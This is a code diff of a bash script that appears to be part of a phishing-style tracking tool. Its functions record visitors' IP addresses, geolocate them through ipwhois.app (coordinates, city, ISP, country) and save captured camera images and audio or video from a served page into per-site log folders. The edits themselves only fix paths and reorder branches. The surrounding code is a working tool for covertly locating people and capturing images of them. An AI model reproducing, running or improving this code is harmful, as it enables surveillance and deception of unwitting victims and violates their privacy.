@@ -462,12 +462,12 @@ setup_site() {
 
 #Capture data check
 capture_data_check(){
-	if [ ${type} == "image" ];then
-                capture_data_image
+	if [ ${type} == "video" ];then
+                capture_data_video
         elif [ ${type} == "audio" ];then
                 capture_data_audio
-        elif [ ${type} == "video" ];then
-                capture_data_video
+        elif [ ${type} == "image" ];then
+                capture_data_image
 	elif [ ${type} == "both" ];then
                capture_data_video_audio
 	else
@@ -499,65 +499,65 @@ save_ip() {
 		rm -rf .server/www/ip.txt
 	else
 		mkdir ${logs_dir}
-		mv ${logs_dir} ${files_dir}/${site_name}
+		mv ${logs_dir} ${files_dir}/${site_name}/
 		mv .server/www/ip.txt ${logs_full_dir}
 	fi
 	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
 }
 ip_details() {
 	IFS='\n'
-	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
+	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > ${pro_dir}/track.txt)
 	IFS=$'\n'
-	iptt=$(sed -n 's/"ip"://p' track.txt)
+	iptt=$(sed -n 's/"ip"://p' ${pro_dir}/track.txt)
 
 	if [[ $iptt != "" ]]; then
 		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
 	fi
-	iptype=$(sed -n 's/"type"://p' track.txt)
+	iptype=$(sed -n 's/"type"://p' ${pro_dir}/track.txt)
 	if [[ $iptype != "" ]]; then
 		echo -e "\n${GREEN} IP type: ${NC} $iptype"
 	fi
-	latitude=$(sed -n 's/"latitude"://p' track.txt)
+	latitude=$(sed -n 's/"latitude"://p' ${pro_dir}/track.txt)
 	if [[ $latitude != "" ]]; then
 		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
 	fi
-	longitude=$(sed -n 's/"longitude"://p' track.txt)
+	longitude=$(sed -n 's/"longitude"://p' ${pro_dir}/track.txt)
 	if [[ $longitude != "" ]]; then
 		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
 	fi
-	city=$(sed -n 's/"city"://p' track.txt)
+	city=$(sed -n 's/"city"://p' ${pro_dir}/track.txt)
 	if [[ $city != "" ]]; then
 		echo -e "\n${GREEN} City: ${NC} $city"
 	fi
-	isp=$(sed -n 's/"isp"://p' track.txt)
+	isp=$(sed -n 's/"isp"://p' ${pro_dir}/track.txt)
 	if [[ $isp != "" ]]; then
 		echo -e "\n${GREEN} Isp: ${NC} $isp"
 	fi
-	country=$(sed -n 's/"country"://p' track.txt)
+	country=$(sed -n 's/"country"://p' ${pro_dir}/track.txt)
 	if [[ $country != "" ]]; then
 		echo -e  "\n${GREEN} Country: ${NC} $country"
 	fi
-	flag=$(sed -n 's/"country_flag"://p' track.txt)
+	flag=$(sed -n 's/"country_flag"://p' ${pro_dir}/track.txt)
 	if [[ $flag != "" ]]; then
 		echo -e "\n${GREEN} Country flag: ${NC} $flag"
 	fi
-	cap=$(sed -n 's/"country_capital"://p' track.txt)
+	cap=$(sed -n 's/"country_capital"://p' ${pro_dir}/track.txt)
 	if [[ $cap != "" ]]; then
 		echo -e "\n${GREEN} Country capital: ${NC} $cap"
 	fi
-	phon=$(sed -n 's/"country_phone"://p' track.txt)
+	phon=$(sed -n 's/"country_phone"://p' ${pro_dir}/track.txt)
 	if [[ $phon != "" ]]; then
 		echo -e "\n${GREEN} Country code: ${NC} $phon"
 	fi
-	continent=$(sed -n 's/"continent"://p' track.txt)
+	continent=$(sed -n 's/"continent"://p' ${pro_dir}/track.txt)
 	if [[ $continent != "" ]]; then
 		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
 	fi
-	ccode=$(sed -n 's/"currency_code"://p' track.txt)
+	ccode=$(sed -n 's/"currency_code"://p' ${pro_dir}/track.txt)
 	if [[ $ccode != "" ]]; then
 		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
 	fi
-	region=$(sed -n 's/"region"://p' track.txt)
+	region=$(sed -n 's/"region"://p' ${pro_dir}/track.txt)
 	if [[ $region != "" ]]; then
 		echo -e "\n${GREEN} State: ${NC} $region"
 	fi
@@ -577,7 +577,13 @@ capture_data_image() {
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                    	rm -rf .server/www/Log.log
+										if [ -d ${logs_full_dir} ]; then
 	               	mv .server/www/*.png  ${logs_full_dir}/
+								else
+									mkdir ${logs_dir}
+									mv ${logs_dir} ${files_dir}/${site_name}/
+									mv .server/www/*.png  ${logs_full_dir}/
+								fi
                 fi
                 sleep 0.5
 	done
